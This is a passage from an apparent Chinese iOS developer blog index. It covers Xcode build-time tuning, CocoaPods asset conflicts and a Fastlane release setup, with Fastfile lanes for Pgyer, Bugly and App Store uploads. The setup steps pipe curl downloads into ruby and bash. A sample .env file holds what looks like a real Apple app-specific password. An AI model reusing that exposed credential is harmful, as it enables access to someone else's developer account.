self.dynamicType.commandAction)\n\n缺点是，函数每增加一个参数，我们就需要写一个泛型函数来管理内存。而且，由于使用的是unowned管理内存，如果使用不当会导致野指针访问导致崩溃。\n参考链接\nhttps://sveinhal.github.io/2016/03/16/retain-cycles-function-references/\nhttps://xebia.com/blog/function-references-in-swift-and-retain-cycles/\nhttps://forums.swift.org/t/implicit-retain-cycle/15238\n\n","categories":["iOS"],"tags":["Swift"]},{"title":"记录一次优化 Xcode 编译的过程","url":"/2020/04/20/optimize-xcode-build-time/","content":"接触新项目后，发现没有改代码的情况下，每次编译基本上编译时间都在一分钟左右。就有了一个想法去解决这个问题，断断续续花了三天时间解决，解决过程中，学习到很多，记录下来。\n0x01 发现问题开启编译耗时显示打开终端执行以下命令并重启Xcode：\n$ defaults write com.apple.dt.Xcode ShowBuildOperationDuration -bool YES\n\n编译 Build编译时长 56.3 s，其中耗时比较长的过程为以下：\n\nCompile asset catalogs：23.5 s\n[CP]Embed Pods Frameworks：7.4 s\n[CP] Copy Pods Resources：17.6 s\n\n0x02 分析&amp;解决问题开始尝试优化 Xcode 编译速度发现编译耗时集中在上面三个过程中，一开始主要关注于 Xcode 本身编译提升，看了很多关于提升 Xcode 编译速度的文章，比如这篇文章：https://elliotsomething.github.io/2018/05/23/XCodeBuild/\n编译时长优化 Find Implicit Dependencies对所编译项目的Scheme进行配置 Product &gt; Scheme &gt; Edit Scheme &gt; Build Build Opitions选项中，去掉Find Implicit Dependencies。\n编译线程数优化$ defaults write com.apple.dt.xcodebuild PBXNumberOfParallelBuildSubtasks `sysctl -n hw.ncpu`$ defaults write com.apple.dt.xcodebuild IDEBuildOperationMaxNumberOfConcurrentCompileTasks `sysctl -n hw.ncpu`$ defaults write com.apple.dt.Xcode PBXNumberOfParallelBuildSubtasks `sysctl -n hw.ncpu`$ defaults write com.apple.dt.Xcode IDEBuildOperationMaxNumberOfConcurrentCompileTasks `sysctl -n hw.ncpu`\n\n其后的数字为指定的编译线程数。Xcode默认使用与CPU核数相同的线程来进行编译，但由于编译过程中的IO操作往往比CPU运算要多，因此适当的提升线程数可以在一定程度上加快编译速度。\n然后做完以上尝试后，优化了4s。😭\n远远没有达到优化的目的。\n寻找另外的解决方向从 Xcode 的本身优化不能有任何的提升后，那问题只能出在工程本身，再次分析编译过程的时长发现和 Assets.xcassets 和 Pods 关系很大。先从 CocoaPods 开始分析 Podfile，发现工程的 Podfile 有如下代码：\n\ninstall! ‘cocoapods’, disable_input_output_paths: true\n\n去掉以后运行 pod install，出现编译出现错误：\n\nerror: Multiple commands produce ‘&#x2F;xxxxx&#x2F;xxxxx&#x2F;Assets.car’:\n\nTarget ‘xxxx’ (project ‘xxx’) has compile command with input ‘&#x2F;xxxx&#x2F;xxxx&#x2F;Assets.xcassets’\n\nThat command depends on command in Target ‘xxx’ (project ‘xxx’): script phase “[CP] Copy Pods Resources”\n\n\n\n在 CocoaPods 上找到了这样一个 issue  https://github.com/CocoaPods/CocoaPods/issues/8122，里面提到主工程里 Assets.xcassets 和 Pods 里有同名的  Assets.xcassets，在 Xcode 10 之前进行编译是不会有问题的，Xcode 只是生成 Warning，但是在 Xcode 10 之后使用了 New Build System 会生成 Errror，提示重复生成 Assets.car。\nissue 里提到了4种解决方案：\n方案1：https://github.com/CocoaPods/CocoaPods/issues/8122#issuecomment-424169508\ninstall! &#x27;cocoapods&#x27;, :disable_input_output_paths =&gt; true\n\n这个方案会导致每次编译时长增加3x倍多。这也刚好是我们工程采用的方式。\n方案2：https://github.com/CocoaPods/CocoaPods/issues/8122#issuecomment-424265887\n 使用  Legacy Build System  而不是 Xcode 11 的 New Build System。\n方案3：在 Podfile 中添加如下代码\nproject_path = &#x27;[YOUR_PROJ_NAME].xcodeproj&#x27;project = Xcodeproj::Project.open(project_path)project.targets.each do |target|  build_phase = target.build_phases.find &#123; |bp| bp.display_name == &#x27;[CP] Copy Pods Resources&#x27; &#125;  assets_path = &#x27;$&#123;TARGET_BUILD_DIR&#125;/$&#123;UNLOCALIZED_RESOURCES_FOLDER_PATH&#125;/Assets.car&#x27;  if build_phase.present? &amp;&amp; build_phase.input_paths.include?(assets_path) == false    build_phase.input_paths.push(assets_path)  endend\n\n这种方案在 CocoaPods 1.8.0 之前可以的，但是在 1.8.0 之后 Input Files 变成了 xcfilelist，就无法直接使用了。\n方案4：https://github.com/CocoaPods/CocoaPods/issues/8122#issuecomment-531726302\n主要代码是在 [CP] Copy Pods Resources的 Input Files  或者 Input File Lists  中添加。\n$ &#123;TARGET_BUILD_DIR&#125;/$&#123;UNLOCALIZED_RESOURCES_FOLDER_PATH&#125;/Assets.car\n\n尝试了以上4种解决方案，只有方案4 符合预期。\n0x03 解决方案使用这个 cocoapods 插件：https://github.com/dreampiggy/cocoapods-xcode-patch\n使用 Bundler 和 Gemfile 添加这个插件：\nsource &quot;https://rubygems.org&quot;gem &#x27;cocoapods&#x27;gem &#x27;cocoapods-xcode-patch&#x27;, :git =&gt; &#x27;https://github.com/dreampiggy/cocoapods-xcode-patch.git&#x27;\n\n使用  bundle exec pod install 替代 pod install 来加载这个插件。\n0x04 原因分析出现这个问题根本原因是因为 CocoaPods 有两种资源管理方式 resource_bundles  和 resources 。\n以下简单介绍下这两种资源管理方式：\nresource_bundles（官方推荐）\nThis attribute allows to define the name and the file of the resource bundles which should be built for the Pod. They are specified as a hash where the keys represent the name of the bundles and the values the file patterns that they should include.\nFor building the Pod as a static library, we strongly recommend library developers to adopt resource bundles as there can be name collisions using the resources attribute.\nThe names of the bundles should at least include the name of the Pod to minimise the chance of name collisions.\nTo provide different resources per platform namespaced bundles must be used.\n\nExamples:spec.ios.resource_bundle = &#123; &#x27;MapBox&#x27; =&gt; &#x27;MapView/Map/Resources/*.png&#x27; &#125;\n\nspec.resource_bundles = &#123;    &#x27;MapBox&#x27; =&gt; [&#x27;MapView/Map/Resources/*.png&#x27;],    &#x27;MapBoxOtherResources&#x27; =&gt; [&#x27;MapView/Map/OtherResources/*.png&#x27;]  &#125;\n\nresources\nA list of resources that should be copied into the target bundle.\nFor building the Pod as a static library, we strongly recommend library developers to adopt resource bundles as there can be name collisions using the resources attribute. Moreover, resources specified with this attribute are copied directly to the client target and therefore they are not optimised by Xcode.\n\nExamples:spec.resource = &#x27;Resources/HockeySDK.bundle&#x27;\n\nspec.resources = [&#x27;Images/*.png&#x27;, &#x27;Sounds/*&#x27;]\n\n由于组件化的原因，我们的某个组件采用了Assets.xcassets 和 Storyboard 需要拷贝到主工程中进行引用，Pod 库只能以 resources 的方式引用资源。经过这次优化编译速度有了很大提升。\n0x05 后续：Pods 文件更改没有更新优化了 Xcode 编译后，出现另外一个问题：更改 Pods 库后，Pods 库已编译但主工程没有使用最新的frameworks，导致动态链接的时候找不到对应的符号而产生崩溃。\n导致这个问题的原因是 Build Phases 中的 [CP] Embed Pods Frameworks 不是每次都执行，猜测可能是 Xcode 11 的 New Build System 做了优化，导致脚本没有执行。最终想了个办法来解决这个问题，追加命令来执行脚本 find &quot;$&#123;PODS_ROOT&#125;&quot; -type f -name *frameworks.sh -exec bash -c &quot;touch \\&quot;&#123;&#125;\\&quot;&quot; \\;，使得脚本每次能执行更新frameworks。\n因为 [CP] Embed Pods Frameworks的脚本是由 CocoaPods 进行修改的，所有我将上面的命令通过hook的方式来追加，具体使用方法可以查看 https://github.com/xwal/cocoapods-xcode-patch。\n编译时间也有所增加，在工程中测试大概增加了20s左右，还有优化的空间，后续如果想到更好的解决办法再更新。\n0x06 参考链接\nhttps://elliotsomething.github.io/2018/05/23/XCodeBuild/\n\nhttps://github.com/CocoaPods/CocoaPods/issues/8122\n\nhttps://guides.cocoapods.org/syntax/podspec.html#resource_bundles\n\n\n","categories":["iOS"],"tags":["Xcode"]},{"title":"Fastlane 实践（一）：自动化打包和发布","url":"/2020/05/04/fastlane-in-action-1/","content":"\n\nfastlane is the easiest way to automate beta deployments and releases for your iOS and Android apps. 🚀 It handles all tedious tasks, like generating screenshots, dealing with code signing, and releasing your application.\n\nfastlane 是自动化Beta部署和发布iOS和Android应用程序最简单方法。它可以处理所有繁琐的任务，例如生成屏幕截图，处理代码签名以及发布应用程序。\nFastlane 安装安装 Xcode command line tools$ xcode-select --install\n\n安装 Homebrew$ /usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;\n\n安装 RVM$ curl -sSL https://get.rvm.io | bash -s stable --auto-dotfiles$ source ~/.rvm/scripts/rvm\n\n修改 RVM 的 Ruby 安装源到 Ruby China 的 Ruby 镜像服务器，这样能提高安装速度。\n$ echo &quot;ruby_url=https://cache.ruby-china.org/pub/ruby&quot; &gt; ~/.rvm/user/db\n\n安装Ruby 2.6.5$ rvm install 2.6.5$ rvm use 2.6.5 --default\n\n更新 RubyGems 镜像$ gem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/$ gem sources -lhttps://gems.ruby-china.org# 确保只有 gems.ruby-china.orgbundle config mirror.https://rubygems.org https://gems.ruby-china.org\n\n安装 CocoaPods 和 Fastlane$ gem install cocoapods$ gem install fastlane -NV$ gem install bundle\n\n\n\n快速开始\n进入 iOS App 的目录并运行：\n fastlane init\n fastlane 会自动自动识别你的项目，并询问任何缺失的信息。\n\nfastlane Getting Started guide for iOS\n\nfastlane Getting Started guide for Android\n\n\nFastlane 进阶用法随着公司项目的增多，每次都运行重复的Fastlane 命令进行配置会低效很多，所以急需一套可以满足所有App需求的配置。\nFastlane 是由Ruby开发，所以也支持 dotenv 的功能。\n最终Fastlane生成目录结构如下：\n\n├── .env├── Appfile├── Deliverfile├── Fastfile├── Matchfile├── Pluginfile├── README.md├── Scanfile├── metadata│   ├── app_icon.jpg│   ├── copyright.txt│   ├── primary_category.txt│   ├── primary_first_sub_category.txt│   ├── primary_second_sub_category.txt│   ├── review_information│   │   ├── demo_password.txt│   │   ├── demo_user.txt│   │   ├── email_address.txt│   │   ├── first_name.txt│   │   ├── last_name.txt│   │   ├── notes.txt│   │   └── phone_number.txt│   ├── secondary_category.txt│   ├── secondary_first_sub_category.txt│   ├── secondary_second_sub_category.txt│   ├── trade_representative_contact_information│   │   ├── address_line1.txt│   │   ├── address_line2.txt│   │   ├── address_line3.txt│   │   ├── city_name.txt│   │   ├── country.txt│   │   ├── email_address.txt│   │   ├── first_name.txt│   │   ├── is_displayed_on_app_store.txt│   │   ├── last_name.txt│   │   ├── phone_number.txt│   │   ├── postal_code.txt│   │   ├── state.txt│   │   └── trade_name.txt│   └── zh-Hans│       ├── apple_tv_privacy_policy.txt│       ├── description.txt│       ├── keywords.txt│       ├── marketing_url.txt│       ├── name.txt│       ├── privacy_url.txt│       ├── promotional_text.txt│       ├── release_notes.txt│       ├── subtitle.txt│       └── support_url.txt└── pem    ├── development_xxx.xxx.xxx.p12    ├── development_xxx.xxx.xxx.pem    ├── development_xxx.xxx.xxx.pkey    ├── production_xxx.xxx.xxx.p12    ├── production_xxx.xxx.xxx.pem    ├── production_xxx.xxx.xxx.pkey\n\n.env这个文件中放入的是需要引用的环境变量。\nFASTLANE_SKIP_UPDATE_CHECK=trueFASTLANE_XCODEBUILD_SETTINGS_TIMEOUT=120APPLE_ID=&quot;xxxx&quot;\t# Apple ID 账号TEAM_ID=&quot;xxxx&quot;\t# Apple Team IDFASTLANE_PASSWORD=&quot;xxx&quot;\t# Apple ID 密码FASTLANE_APPLE_APPLICATION_SPECIFIC_PASSWORD=&quot;qwwe-tdpp-hdpc-fgzy&quot; # Apple 应用程序特定密码，Apple ID 现在强制开启两步验证后，此密码是必须的ITC_TEAM_ID=&quot;xxxx&quot;\t# iTunes Connect Team IDAPP_IDENTIFIER=&quot;xxx.xxx.xxx&quot;SCHEME_NAME=&quot;XXX&quot;WORKSPACE_NAME=&quot;XXX.xcworkspace&quot;XCODEPROJ_NAME=&quot;XXX.xcodeproj&quot;# 测试环境DEV_APP_IDENTIFIER=&quot;xxx.xxx.dev.xxx&quot;DEV_APP_NAME=&quot;XXX测试版&quot;# 正式环境PROD_APP_IDENTIFIER=&quot;xxx.xxx.xxx&quot;PROD_APP_NAME=&quot;XXX&quot;MATCH_GIT_BRANCH=&quot;XXX&quot;DELIVER_METADATA_PATH=&quot;./fastlane/metadata&quot;DOWNLOAD_METADATA_PATH=&quot;./metadata&quot;\n\nAppfileapp_identifier &quot;#&#123;ENV[&quot;APP_IDENTIFIER&quot;]&#125;&quot; # The bundle identifier of your appapple_id &quot;#&#123;ENV[&quot;APPLE_ID&quot;]&#125;&quot; # Your Apple email addressteam_id &quot;#&#123;ENV[&quot;TEAM_ID&quot;]&#125;&quot; # Developer Portal Team IDitc_team_id &quot;#&#123;ENV[&quot;ITC_TEAM_ID&quot;]&#125;&quot; # App Store Connect Team ID# you can even provide different app identifiers, Apple IDs and team names per lane:# More information: https://github.com/fastlane/fastlane/blob/master/fastlane/docs/Appfile.md\n\nDeliverfile###################### More Options ####################### If you want to have even more control, check out the documentation# https://docs.fastlane.tools/actions/deliver###################### Automatically generated ####################### Feel free to remove the following line if you use fastlane (which you should)app_identifier &quot;#&#123;ENV[&quot;APP_IDENTIFIER&quot;]&#125;&quot; # The bundle identifier of your appusername &quot;#&#123;ENV[&quot;APPLE_ID&quot;]&#125;&quot; # your Apple ID user\n\nFastfile# Customise this file, documentation can be found here:# https://docs.fastlane.tools/actions/# All available actions: https://docs.fastlane.tools/actions# can also be listed using the `fastlane actions` command# Change the syntax highlighting to Ruby# All lines starting with a # are ignored when running `fastlane`# If you want to automatically update fastlane if a new version is available:# update_fastlane# This is the minimum version number required.# Update this, if you use features of a newer versionfastlane_require &quot;spaceship&quot;fastlane_version &quot;2.89.0&quot;default_platform :iosplatform :ios do  base_path = Pathname::new(File::dirname(__FILE__)).realpath.parent  before_all do    # ENV[&quot;SLACK_URL&quot;] = &quot;https://hooks.slack.com/services/...&quot;    # cocoapods    # carthage  end  desc &quot;生成 adhoc 测试版本，提交到蒲公英，参数 =&gt; type:&#x27;adhoc/development&#x27;，默认adhoc&quot;  lane :pgyer_beta do |options|    type = String(options[:type] || &quot;adhoc&quot;)    if type == &quot;adhoc&quot;      export_method = &quot;ad-hoc&quot;      match_type = &quot;adhoc&quot;      match_type_name = &quot;AdHoc&quot;    else      export_method = &quot;development&quot;      match_type = &quot;development&quot;      match_type_name = &quot;Development&quot;    end    git_reversion = sh(&quot;git log -1 --pretty=format:&#x27;%h&#x27;&quot;)    version_number = get_info_plist_value(path: &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;/Info.plist&quot;, key: &quot;CFBundleShortVersionString&quot;)    build_number = number_of_commits(all: false)    # git log    git_log = sh(&quot;git log --no-merges -1 --pretty=format:&#x27;# %ai%n# %B by %an&#x27;&quot;)    build_time = Time.new.strftime(&quot;%Y-%m-%d_%H.%M.%S&quot;)    # 输出目录    output_dir = &quot;#&#123;base_path&#125;/Output/adhoc/#&#123;build_time&#125;&quot;    output_name = &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;_v#&#123;version_number&#125;(#&#123;build_number&#125;).ipa&quot;    # 更新badge    add_badge(shield: &quot;#&#123;version_number&#125;-#&#123;build_number&#125;-orange&quot;)    # 更新 build number    increment_build_number(build_number: build_number)    # 更新 product bundle identifier    update_app_identifier(      xcodeproj: &quot;#&#123;ENV[&quot;XCODEPROJ_NAME&quot;]&#125;&quot;,      plist_path: &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;/Info.plist&quot;,      app_identifier: &quot;#&#123;ENV[&quot;DEV_APP_IDENTIFIER&quot;]&#125;&quot;    )    # 更新display名称，PS: 不能用来更新bundle identifier    update_info_plist(      xcodeproj: &quot;#&#123;ENV[&quot;XCODEPROJ_NAME&quot;]&#125;&quot;,      plist_path: &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;/Info.plist&quot;,      block: proc do |plist|        plist[&quot;CFBundleDisplayName&quot;] = &quot;#&#123;ENV[&quot;DEV_APP_NAME&quot;]&#125;&quot;        plist[&quot;CFBundleName&quot;] = &quot;#&#123;ENV[&quot;DEV_APP_NAME&quot;]&#125;&quot;        plist[&quot;GIT_REVISION&quot;] = git_reversion        plist[&quot;BUILD_TIME&quot;] = build_time        plist[&quot;APP_CHANNEL&quot;] = &quot;pgyer&quot;        urlScheme = plist[&quot;CFBundleURLTypes&quot;].find&#123;|scheme| scheme[&quot;CFBundleURLName&quot;] == &quot;weixin&quot;&#125;        urlScheme[:CFBundleURLSchemes] = [&quot;#&#123;ENV[&quot;DEV_WEIXIN_APPID&quot;]&#125;&quot;]      end    )    # 更新Notification Service Extension plist    update_app_identifier(      xcodeproj: &quot;#&#123;ENV[&quot;XCODEPROJ_NAME&quot;]&#125;&quot;,      plist_path: &quot;#&#123;ENV[&quot;NOTIFICATIONSERVICE_SCHEME_NAME&quot;]&#125;/Info.plist&quot;,      app_identifier: &quot;#&#123;ENV[&quot;DEV_NOTIFICATION_SERVICE&quot;]&#125;&quot;    )    match(      type: &quot;#&#123;match_type&#125;&quot;,       app_identifier: [&quot;#&#123;ENV[&quot;DEV_APP_IDENTIFIER&quot;]&#125;&quot;, &quot;#&#123;ENV[&quot;DEV_NOTIFICATION_SERVICE&quot;]&#125;&quot;],       readonly: true    )    gym(      export_method: &quot;#&#123;export_method&#125;&quot;,      include_bitcode: false,      scheme: &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;&quot;,       configuration: &quot;AdHoc&quot;,      export_options: &#123;        compileBitcode: false,        uploadBitcode: false,        provisioningProfiles: &#123;          &quot;#&#123;ENV[&quot;DEV_APP_IDENTIFIER&quot;]&#125;&quot; =&gt; &quot;match #&#123;match_type_name&#125; #&#123;ENV[&quot;DEV_APP_IDENTIFIER&quot;]&#125;&quot;,          &quot;#&#123;ENV[&quot;DEV_NOTIFICATION_SERVICE&quot;]&#125;&quot; =&gt; &quot;match #&#123;match_type_name&#125; #&#123;ENV[&quot;DEV_NOTIFICATION_SERVICE&quot;]&#125;&quot;        &#125;      &#125;,      output_directory: output_dir,      output_name: output_name    )    # pilot    upload_ipa(type: &#x27;gxm&#x27;, log: git_log)    # 上传 dsym 文件到 bugly    bugly(app_id: &quot;#&#123;ENV[&quot;DEV_BUGLY_APPID&quot;]&#125;&quot;,      app_key:&quot;#&#123;ENV[&quot;DEV_BUGLY_APPKEY&quot;]&#125;&quot;,      symbol_type: 2,      bundle_id: &quot;#&#123;ENV[&quot;DEV_APP_IDENTIFIER&quot;]&#125;&quot;,      product_version: &quot;#&#123;version_number&#125;(#&#123;build_number&#125;)&quot;,      channel: &#x27;pgyer&#x27;    )    copy_dsym(tpye: &#x27;adhoc&#x27;)  end  desc &quot;生成 adhoc 预发版本，提交到蒲公英&quot;  lane :pgyer_release do    git_reversion = sh(&quot;git log -1 --pretty=format:&#x27;%h&#x27;&quot;)    build_time = Time.new.strftime(&quot;%Y-%m-%d_%H.%M.%S&quot;)    version_number = get_info_plist_value(path: &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;/Info.plist&quot;, key: &quot;CFBundleShortVersionString&quot;)    build_number = number_of_commits(all: false)    git_log = sh(&quot;git log --no-merges -1 --pretty=format:&#x27;# %ai%n# %B by %an&#x27;&quot;)    # 输出目录    output_dir = &quot;#&#123;base_path&#125;/Output/release/#&#123;build_time&#125;&quot;    output_name = &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;_v#&#123;version_number&#125;(#&#123;build_number&#125;).ipa&quot;    # 更新badge    add_badge(shield: &quot;#&#123;version_number&#125;-#&#123;build_number&#125;-orange&quot;, alpha: true)    # 更新 build number    increment_build_number(build_number: build_number)    update_app_identifier(      xcodeproj: &quot;#&#123;ENV[&quot;XCODEPROJ_NAME&quot;]&#125;&quot;,      plist_path: &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;/Info.plist&quot;,      app_identifier: &quot;#&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;&quot;    )    update_info_plist(      xcodeproj: &quot;#&#123;ENV[&quot;XCODEPROJ_NAME&quot;]&#125;&quot;,      plist_path: &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;/Info.plist&quot;,      block: proc do |plist|        plist[&quot;CFBundleDisplayName&quot;] = &quot;#&#123;ENV[&quot;PROD_APP_NAME&quot;]&#125;&quot;        plist[&quot;CFBundleName&quot;] = &quot;#&#123;ENV[&quot;PROD_APP_NAME&quot;]&#125;&quot;        plist[&quot;GIT_REVISION&quot;] = git_reversion        plist[&quot;BUILD_TIME&quot;] = build_time        plist[&quot;APP_CHANNEL&quot;] = &quot;pgyer&quot;        urlScheme = plist[&quot;CFBundleURLTypes&quot;].find&#123;|scheme| scheme[&quot;CFBundleURLName&quot;] == &quot;weixin&quot;&#125;        urlScheme[:CFBundleURLSchemes] = [&quot;#&#123;ENV[&quot;PROD_WEIXIN_APPID&quot;]&#125;&quot;]      end    )    # 更新Notification Service Extension plist    update_app_identifier(      xcodeproj: &quot;#&#123;ENV[&quot;XCODEPROJ_NAME&quot;]&#125;&quot;,      plist_path: &quot;#&#123;ENV[&quot;NOTIFICATIONSERVICE_SCHEME_NAME&quot;]&#125;/Info.plist&quot;,      app_identifier: &quot;#&#123;ENV[&quot;PROD_NOTIFICATION_SERVICE&quot;]&#125;&quot;    )    match(      type: &quot;adhoc&quot;,       app_identifier: [&quot;#&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;&quot;, &quot;#&#123;ENV[&quot;PROD_NOTIFICATION_SERVICE&quot;]&#125;&quot;],       readonly: true    )    update_project_provisioning(      xcodeproj: &quot;#&#123;ENV[&quot;XCODEPROJ_NAME&quot;]&#125;&quot;,      target_filter: &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;&quot;,      profile:ENV[&quot;sigh_#&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;_adhoc_profile-path&quot;],      build_configuration: &quot;Release&quot;    )    update_project_provisioning(      xcodeproj: &quot;#&#123;ENV[&quot;XCODEPROJ_NAME&quot;]&#125;&quot;,      target_filter: &quot;#&#123;ENV[&quot;NOTIFICATIONSERVICE_SCHEME_NAME&quot;]&#125;&quot;,      profile:ENV[&quot;sigh_#&#123;ENV[&quot;PROD_NOTIFICATION_SERVICE&quot;]&#125;_adhoc_profile-path&quot;],      build_configuration: &quot;Release&quot;    )    gym(      export_method: &quot;ad-hoc&quot;,       scheme: &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;&quot;,       configuration: &quot;Release&quot;,      export_options: &#123;        compileBitcode: false,        uploadBitcode: false,        provisioningProfiles: &#123;          &quot;#&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;&quot; =&gt; &quot;match AdHoc #&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;&quot;,          &quot;#&#123;ENV[&quot;PROD_NOTIFICATION_SERVICE&quot;]&#125;&quot; =&gt; &quot;match AdHoc #&#123;ENV[&quot;PROD_NOTIFICATION_SERVICE&quot;]&#125;&quot;        &#125;      &#125;,      output_directory: output_dir,      output_name: output_name    )    # pilot        # 上传蒲公英    upload_ipa(type: &#x27;gxm&#x27;, log: &quot;App Store 包上传：#&#123;version_number&#125;(#&#123;build_number&#125;)&quot;)    # 上传 dsym 文件到 bugly    bugly(app_id: &quot;#&#123;ENV[&quot;PROD_BUGLY_APPID&quot;]&#125;&quot;,      app_key:&quot;#&#123;ENV[&quot;PROD_BUGLY_APPKEY&quot;]&#125;&quot;,      symbol_type: 2,      bundle_id: &quot;#&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;&quot;,      product_version: &quot;#&#123;version_number&#125;(#&#123;build_number&#125;)&quot;,      channel: &#x27;pgyer&#x27;    )    copy_dsym(tpye: &#x27;release&#x27;)  end  desc &quot;生成 appstore 版本，发布到 App Store&quot;  lane :appstore_release do    git_reversion = sh(&quot;git log -1 --pretty=format:&#x27;%h&#x27;&quot;)    build_time = Time.new.strftime(&quot;%Y-%m-%d_%H.%M.%S&quot;)    version_number = get_info_plist_value(path: &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;/Info.plist&quot;, key: &quot;CFBundleShortVersionString&quot;)    build_number = number_of_commits(all: false)    # 输出目录    output_dir = &quot;#&#123;base_path&#125;/Output/appstore/#&#123;build_time&#125;&quot;    output_name = &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;_v#&#123;version_number&#125;(#&#123;build_number&#125;).ipa&quot;    clear_derived_data    # 更新 build number    increment_build_number(build_number: build_number)    update_app_identifier(      xcodeproj: &quot;#&#123;ENV[&quot;XCODEPROJ_NAME&quot;]&#125;&quot;,      plist_path: &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;/Info.plist&quot;,      app_identifier: &quot;#&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;&quot;    )    update_info_plist(      xcodeproj: &quot;#&#123;ENV[&quot;XCODEPROJ_NAME&quot;]&#125;&quot;,      plist_path: &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;/Info.plist&quot;,      block: proc do |plist|        plist[&quot;CFBundleDisplayName&quot;] = &quot;#&#123;ENV[&quot;PROD_APP_NAME&quot;]&#125;&quot;        plist[&quot;CFBundleName&quot;] = &quot;#&#123;ENV[&quot;PROD_APP_NAME&quot;]&#125;&quot;        plist[&quot;GIT_REVISION&quot;] = git_reversion        plist[&quot;BUILD_TIME&quot;] = build_time        plist[&quot;APP_CHANNEL&quot;] = &quot;appstore&quot;        urlScheme = plist[&quot;CFBundleURLTypes&quot;].find&#123;|scheme| scheme[&quot;CFBundleURLName&quot;] == &quot;weixin&quot;&#125;        urlScheme[:CFBundleURLSchemes] = [&quot;#&#123;ENV[&quot;PROD_WEIXIN_APPID&quot;]&#125;&quot;]      end    )    # 更新Notification Service Extension plist    update_app_identifier(      xcodeproj: &quot;#&#123;ENV[&quot;XCODEPROJ_NAME&quot;]&#125;&quot;,      plist_path: &quot;#&#123;ENV[&quot;NOTIFICATIONSERVICE_SCHEME_NAME&quot;]&#125;/Info.plist&quot;,      app_identifier: &quot;#&#123;ENV[&quot;PROD_NOTIFICATION_SERVICE&quot;]&#125;&quot;    )    match(      type: &quot;appstore&quot;,       app_identifier: [&quot;#&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;&quot;, &quot;#&#123;ENV[&quot;PROD_NOTIFICATION_SERVICE&quot;]&#125;&quot;],       readonly: true    )    update_project_provisioning(      xcodeproj: &quot;#&#123;ENV[&quot;XCODEPROJ_NAME&quot;]&#125;&quot;,      target_filter: &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;&quot;,      profile:ENV[&quot;sigh_#&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;_appstore_profile-path&quot;],      build_configuration: &quot;AppStore&quot;    )    update_project_provisioning(      xcodeproj: &quot;#&#123;ENV[&quot;XCODEPROJ_NAME&quot;]&#125;&quot;,      target_filter: &quot;#&#123;ENV[&quot;NOTIFICATIONSERVICE_SCHEME_NAME&quot;]&#125;&quot;,      profile:ENV[&quot;sigh_#&#123;ENV[&quot;PROD_NOTIFICATION_SERVICE&quot;]&#125;_appstore_profile-path&quot;],      build_configuration: &quot;AppStore&quot;    )    # snapshot    gym(      export_method: &quot;app-store&quot;,       scheme: &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;&quot;,       configuration: &quot;AppStore&quot;,      export_options: &#123;        provisioningProfiles: &#123;          &quot;#&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;&quot; =&gt; &quot;match AppStore #&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;&quot;,          &quot;#&#123;ENV[&quot;PROD_NOTIFICATION_SERVICE&quot;]&#125;&quot; =&gt; &quot;match AppStore #&#123;ENV[&quot;PROD_NOTIFICATION_SERVICE&quot;]&#125;&quot;        &#125;      &#125;,      output_directory: output_dir,      output_name: output_name    )    # 上传 dsym 文件到 bugly    bugly(app_id: &quot;#&#123;ENV[&quot;PROD_BUGLY_APPID&quot;]&#125;&quot;,      app_key:&quot;#&#123;ENV[&quot;PROD_BUGLY_APPKEY&quot;]&#125;&quot;,      symbol_type: 2,      bundle_id: &quot;#&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;&quot;,      product_version: &quot;#&#123;version_number&#125;(#&#123;build_number&#125;)&quot;,      channel: &#x27;appstore&#x27;    )    # 上传蒲公英    upload_ipa(type: &#x27;gxm&#x27;, log: &quot;App Store 包上传：#&#123;version_number&#125;(#&#123;build_number&#125;)&quot;)    copy_dsym(type: &#x27;appstore&#x27;)    deliver(      metadata_path: &quot;#&#123;ENV[&quot;DELIVER_METADATA_PATH&quot;]&#125;&quot;,      force: true    )    # frameit  end  desc &quot;上传 AppStore DSYM 文件到 Bugly，参数 =&gt; version:[latest]&quot;  lane :upload_appstore_dsyms do |options|    version = String(options[:version] || &quot;latest&quot;)    download_dsyms(version: version)    dsym_paths = lane_context[SharedValues::DSYM_PATHS]    for dsym_path in dsym_paths      # 解析DSYM文件版本      split_strs = dsym_path.split(/\\//).last.split(/-/)      version_number = split_strs[1]      build_number = split_strs[2].split(/\\./)[0]      # 上传 dsym 文件到 bugly      bugly(app_id: &quot;#&#123;ENV[&quot;PROD_BUGLY_APPID&quot;]&#125;&quot;,        app_key:&quot;#&#123;ENV[&quot;PROD_BUGLY_APPKEY&quot;]&#125;&quot;,        symbol_type: 2,        bundle_id: &quot;#&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;&quot;,        product_version: &quot;#&#123;version_number&#125;(#&#123;build_number&#125;)&quot;,        channel: 